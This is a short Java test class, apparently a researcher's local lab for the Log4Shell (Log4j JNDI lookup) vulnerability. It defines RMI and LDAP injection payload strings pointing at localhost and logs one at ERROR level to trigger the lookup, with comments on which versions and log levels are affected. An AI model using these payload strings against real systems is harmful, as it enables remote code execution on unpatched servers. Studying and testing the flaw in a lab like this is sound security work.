package com.venscor.jdni;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author wangyu07 <wangyu07@kuaishou.com>
 * Created on 2022-02-09
 */
public class Log4jVersion15Test {
    private static final Logger LOGGER = LogManager.getLogger(Log4jVersion15Test.class);


    private static final String RMI_PAYLOAD = "${jndi:rmi://127.0.0.1:53424/exp}";

    private static final String LDAP_PAYLOAD = "${jndi:ldap://127.0.0.1:53425/nameNoMatter}";

    private static final String PAYLOAD_FOR_LEARN =
            "${jndi:ldap://127.0.0.1:53425/nameNoMatter}${jndi:ldap://127.0.0.1:53425/nameNoMatter}";

    //https://logging.apache.org/log4j/2.x/security.html
    //As of Log4j 2.15.0 the message lookups feature was disabled by default.
    //https://www.anquanke.com/post/id/201181
    public static void main(String[] args) {


        //        LOGGER.warn(LDAP_PAYLOAD);

        //log4j的默认日志级别是ERROR，ERROR以下触发不了；
        //2.14.0上测试：见org/apache/logging/log4j/core/config/AbstractConfiguration.java

        //LOGGER.error(RMI_PAYLOAD);

        LOGGER.error(LDAP_PAYLOAD);


    }
}
